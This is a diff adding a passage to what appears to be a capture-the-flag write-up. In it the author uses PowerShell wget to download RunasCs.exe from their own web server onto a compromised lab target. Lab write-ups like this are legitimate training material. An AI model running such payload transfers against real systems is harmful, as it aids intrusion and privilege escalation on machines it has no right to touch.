@@ -533,5 +533,22 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 After downloading it to my system i can host it on a python web server
 
 ```python
+PS C:\Users\web_account\Documents> wget http://10.10.14.90:8000/RunasCs.exe -o runas.exe
+PS C:\Users\web_account\Documents> dir
+
+
+    Directory: C:\Users\web_account\Documents
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----         5/12/2026   8:01 PM          51712 runas.exe                                                            
+
+
+PS C:\Users\web_account\Documents> 
+```
+I have now transferred it to the target!
+
+```python
 
 ```
